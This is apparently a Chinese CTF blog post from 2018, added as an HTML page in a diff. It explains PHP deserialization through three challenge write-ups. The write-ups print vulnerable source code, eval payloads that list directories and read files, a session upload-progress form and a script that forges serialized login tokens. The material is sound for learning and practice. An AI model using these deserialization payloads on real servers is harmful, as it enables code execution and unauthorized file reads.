@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>反序列化 | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JarvisOJ"><span class="toc-text">JarvisOJ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bugku上的一题"><span class="toc-text">bugku上的一题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ichunqiu-百度杯十月第一周-login"><span class="toc-text">ichunqiu 百度杯十月第一周 login</span></a></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">反序列化</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 5, 2018&nbsp;&nbsp;10:25:50</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <p>CTF中反序列化问题还是经常出现的,于是有了这篇博客,简单的学习一下反序列化的一些问题</p>
+<a id="more"></a>
+
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>参考博客<br><a href="https://comicalt.github.io/2018/08/21/serialize/#more" target="_blank" rel="noopener">https://comicalt.github.io/2018/08/21/serialize/#more</a><br><a href="https://bbs.ichunqiu.com/thread-45290-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-45290-1-1.html</a> //这里面举了一题,充分讲解了各个魔术方法的调用时刻</p>
+<p>PHP序列化漏洞常用的魔术方法：<br>__construct():当一个类被创建时自动调用<br>__destruct():当一个类被销毁时自动调用<br>__invoke():当把一个类当作函数使用时自动调用<br>__tostring():当把一个类当作字符串使用时自动调用<br>__wakeup():当调用unserialize()函数时自动调用<br>__sleep():当调用serialize()函数时自动调用<br>__call():当要调用的方法不存在或权限不足时自动调用</p>
+<h2 id="JarvisOJ"><a href="#JarvisOJ" class="headerlink" title="JarvisOJ"></a>JarvisOJ</h2><p>jarvisoj:<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a><br>参考writeup<br><a href="https://otakekumi.github.io/2017/03/05/jarvis-oj-phpinfo/" target="_blank" rel="noopener">https://otakekumi.github.io/2017/03/05/jarvis-oj-phpinfo/</a><br><a href="https://www.scanfsec.com/jarvisoj_web_writeup.html" target="_blank" rel="noopener">https://www.scanfsec.com/jarvisoj_web_writeup.html</a><br><a href="https://cloud.tencent.com/developer/article/1038017" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1038017</a><br>参考了三个题解才大概理解了这题,主要是大佬懂得太多,写题解的时候就比较洁简<br>总结一下唉</p>
+<p>点开题目就可以得到源码</p>
+<pre><code>&lt;?php
+//A webshell is wait for you
+ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);
+session_start();
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this-&gt;mdzz = &apos;phpinfo();&apos;;
+    }    
+
+    function __destruct()
+    {
+        eval($this-&gt;mdzz);
+    }
+}
+if(isset($_GET[&apos;phpinfo&apos;]))
+{
+    $m = new OowoO();
+}
+else
+{
+    highlight_string(file_get_contents(&apos;index.php&apos;));
+}
+?&gt;</code></pre><p>看到第一行 session.serialize_handler 就知道这题是反序列化题目.<br>根据第二个参数会使用不同的序列化引擎，大致有这么几种：</p>
+<pre><code>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
+php:存储方式是，键名+竖线+经过serialize()函数序列处理的值    
+php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</code></pre><p>题目上用的是php,默认的序列化引擎.<br>源码很清晰判断仅仅判断是否存在传入phpinfo这个参数,所以突破点应该不是在这.不过还是先构造phpinfo=1 使得调用phpinfo(),参看php各种参数信息<br>PS:由phpinfo获取有用信息的能力有待提高…<br>由于我们是要想办法给session写入构造好的恶意字符串在phpinfo里寻找到session配置一栏<br>session.upload_progress.enabled 发现开启了文件上传功能<br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，<br>当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session<br>那么现在就有了往session写值的方法<br>打印出当前目录下的所有文件</p>
+<pre><code>‘print_r(scandir(dirname(__FILE__)));’</code></pre><p>打印出指定文件的内容</p>
+<pre><code>‘print_r(file_get_contents(“/opt/lampp/htdocs/xxxxxxxx”));’</code></pre><p>修改一下题目给的脚本生成对应的序列化后的字符串</p>
+<pre><code>&lt;?php
+//A webshell is wait for you
+ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);
+session_start();
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+    //$this-&gt;mdzz = &apos;print_r(scandir(dirname(__FILE__)));&apos;;
+    $this-&gt;mdzz = &apos;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&apos;;
+    }
+
+    function __destruct()
+    {
+        eval($this-&gt;mdzz);
+    }
+}
+$obj=new OowoO();</code></pre><p>echo serialize($obj);<br>    ?&gt;</p>
+<p>构造上传文件的表单</p>
+<pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+    &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;</code></pre><p>抓包修改 PHP_SESSION_UPLOAD_PROGRESS 的值就好了</p>
+<h2 id="bugku上的一题"><a href="#bugku上的一题" class="headerlink" title="bugku上的一题"></a>bugku上的一题</h2><p>由源码可知,利用文件包含读取hint.php源码,</p>
+<pre><code>hint.php
+&lt;?php  
+
+class Flag{//flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;good&quot;);
+        }  
+    }  
+}  
+?&gt;  </code></pre><p>再读取index.php的源码</p>
+<pre><code>index.php
+&lt;?php  
+$txt = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$password = $_GET[&quot;password&quot;];  
+
+if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello friend!&lt;br&gt;&quot;;  
+    if(preg_match(&quot;/flag/&quot;,$file)){ 
+        echo &quot;ä¸è½ç°å¨å°±ç»ä½ flagå¦&quot;;
+        exit();  
+    }else{  
+        include($file);   
+        $password = unserialize($password);  
+        echo $password;  
+    }  
+}else{  
+    echo &quot;you are not the number of bugku ! &quot;;  
+}  
+
+?&gt;  
+
+&lt;!--  
+$user = $_GET[&quot;txt&quot;];  
+$file = $_GET[&quot;file&quot;];  
+$pass = $_GET[&quot;password&quot;];  
+
+if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){  
+    echo &quot;hello admin!&lt;br&gt;&quot;;  
+    include($file); //hint.php  
+}else{  
+    echo &quot;you are not admin ! &quot;;  
+}  
+ --&gt;  </code></pre><p>分析可得只要把将flag.php作为字符串使用就会输出flag.php里的内容,有index.php里的源码可以注意到password进行反序列化,并且有echo,这时便调用了_tostring()这个魔术方法,所以只要将FLAG.class序列化后的值赋给password,便可以得到flag</p>
+<h2 id="ichunqiu-百度杯十月第一周-login"><a href="#ichunqiu-百度杯十月第一周-login" class="headerlink" title="ichunqiu 百度杯十月第一周 login"></a>ichunqiu 百度杯十月第一周 login</h2><pre><code>&lt;!-- &lt;?php
+    include &apos;common.php&apos;;
+    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
+    class db
+    {
+        public $where;
+        function __wakeup()
+        {
+            if(!empty($this-&gt;where))
+            {
+                $this-&gt;select($this-&gt;where);
+            }
+        }
+
+        function select($where)
+            {
+            $sql = mysql_query(&apos;select * from user where &apos;.$where);
+            return @mysql_fetch_array($sql);
+        }
+    }
+
+    if(isset($requset[&apos;token&apos;]))
+    {
+        $login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;])));
+        $db = new db();
+        $row = $db-&gt;select(&apos;user=\&apos;&apos;.mysql_real_escape_string($login[&apos;user&apos;]).&apos;\&apos;&apos;);
+        if($login[&apos;user&apos;] === &apos;ichunqiu&apos;)
+        {
+            echo $flag;
+        }else if($row[&apos;pass&apos;] !== $login[&apos;pass&apos;]){
+            echo &apos;unserialize injection!!&apos;;
+        }else{
+            echo &quot;(â¯âµâ¡â²)â¯ï¸µâ´ââ´ &quot;;
+        }
+    }else{
+        header(&apos;Location: index.php?error=1&apos;);
+    }
+
+?&gt; --&gt;(â¯âµâ¡â²)â¯ï¸µâ´ââ´</code></pre><p>前面省略一些骚操作后可以得到源码,这题是将发送到服务器的值反序列化后得到一个数组,当这个数组里user的值等于ichunqiu时输出flag</p>
+<pre><code>$login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;])));</code></pre><p>其实就是将这句逆向一下再赋值给cookie的token传入服务器就ok了<br>payload:</p>
+<pre><code>&lt;?php  
+$request = array_merge($_GET,$_POST,$_COOKIE);
+$arr = array(&apos;user&apos;=&gt;&apos;ichunqiu&apos;);
+$a = base64_encode(gzcompress(serialize($arr)));
+$login = unserialize(gzuncompress(base64_decode($a)));
+echo $a;
+echo &apos;##&apos;+$login;
+?&gt;  </code></pre>
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2018/09/05/反序列化/">http://yoursite.com/2018/09/05/反序列化/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/09/20/ORDERBY/">浅析Order by 注入</a>
+            
+            
+            <a class="next" rel="next" href="/2018/08/31/race-condtion/">Race-condition</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
